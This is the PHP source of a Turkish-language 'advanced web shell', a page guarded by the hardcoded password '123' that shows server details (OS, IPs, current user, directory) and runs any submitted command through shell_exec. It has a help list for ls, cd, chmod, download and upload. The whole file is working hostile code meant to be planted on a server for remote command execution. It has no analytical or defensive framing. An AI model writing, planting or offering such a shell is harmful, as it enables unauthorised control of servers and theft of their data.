<?php
// Oturum başlatma
session_start();

// Şifre ile koruma
$sifre = "123";

// Eğer kullanıcı şifreyi doğru girmezse, giriş formunu göster
if (!isset($_SESSION['giris']) || $_SESSION['giris'] !== true) {
    if (isset($_POST['sifre']) && $_POST['sifre'] === $sifre) {
        $_SESSION['giris'] = true; // Başarılı giriş durumunda oturumu aç
    } else {
        echo '<form method="post">
            <h3>Web Shell Girişi</h3>
            Şifre: <input type="password" name="sifre" class="input-field">
            <button type="submit" class="submit-btn">Giriş</button>
        </form>';
        exit;
    }
}

// Sistem bilgilerini toplama
$isletim_sistemi = php_uname();
$sunucu_ip = $_SERVER['SERVER_ADDR'] ?? 'Bilinmiyor';
$kullanici_ip = $_SERVER['REMOTE_ADDR'] ?? 'Bilinmiyor';
$mevcut_kullanici = get_current_user();
$mevcut_dizin = getcwd();

// Komut çalıştırma
$cikti = '';
$helpText = [
    'ls' => 'Listeleme komutudur. Kullanımı: ls [dizin]',
    'cd' => 'Dizin değiştirir. Kullanımı: cd [dizin]',
    'download' => 'Dosya indirir. Kullanımı: download [dosya_adı]',
    'upload' => 'Dosya yükler. Kullanımı: upload [dosya_adı]',
    'chmod' => 'Dosya izinlerini değiştirir. Kullanımı: chmod [izinler] [dosya_adı]',
];

if (isset($_POST['komut']) && !empty($_POST['komut'])) {
    $komut = trim($_POST['komut']);
    
    // Yardım komutu
    if ($komut === 'help') {
        $cikti = implode("\n", array_map(fn($key, $value) => "$key: $value", array_keys($helpText), $helpText));
    } else {
        $cikti = shell_exec($komut);
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gelişmiş Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f6f9;
            margin: 0;
            padding: 20px;
        }
        .container {
            background-color: #ffffff;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            max-width: 900px;
            margin: auto;
        }
        h1 {
            margin-top: 0;
            color: #007bff;
        }
        .info {
            background-color: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .info p {
            margin: 5px 0;
            color: #333;
        }
        textarea {
            width: 100%;
            height: 200px;
            margin-top: 10px;
            padding: 10px;
            font-family: monospace;
            font-size: 14px;
            background-color: #f8f9fa;
            border: 1px solid #ccc;
            border-radius: 5px;
            resize: none;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        .submit-btn {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        .submit-btn:hover {
            background-color: #0056b3;
        }
        .command-list {
            background-color: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
        }
        .command-list ul {
            list-style-type: none;
            padding-left: 0;
            margin: 0;
        }
        .command-list li {
            margin-bottom: 10px;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Gelişmiş Web Shell</h1>
        <div class="info">
            <p><strong>İşletim Sistemi:</strong> <?php echo $isletim_sistemi; ?></p>
            <p><strong>Sunucu IP:</strong> <?php echo $sunucu_ip; ?></p>
            <p><strong>Kullanıcı IP:</strong> <?php echo $kullanici_ip; ?></p>
            <p><strong>Mevcut Kullanıcı:</strong> <?php echo $mevcut_kullanici; ?></p>
            <p><strong>Mevcut Dizin:</strong> <?php echo $mevcut_dizin; ?></p>
        </div>

        <form method="post">
            <label for="komut">Komut Çalıştır:</label>
            <input type="text" name="komut" id="komut" placeholder="Komut girin" class="input-field" value="">
            <button type="submit" class="submit-btn">Çalıştır</button>
        </form>

        <div class="command-list">
            <h3>En Çok Kullanılan Komutlar:</h3>
            <ul>
                <li><b>ls</b> - Dizin içeriğini listele</li>
                <li><b>cd [dizin]</b> - Dizin değiştir</li>
                <li><b>chmod [izinler] [dosya]</b> - Dosya izinlerini değiştir</li>
                <li><b>download [dosya]</b> - Dosya indir</li>
                <li><b>upload [dosya]</b> - Dosya yükle</li>
                <li><b>help</b> - Komutları öğren</li>
            </ul>
        </div>

        <?php if ($cikti): ?>
            <h3>Çıktı:</h3>
            <textarea readonly><?php echo htmlspecialchars($cikti); ?></textarea>
        <?php endif; ?>
    </div>
</body>
</html>
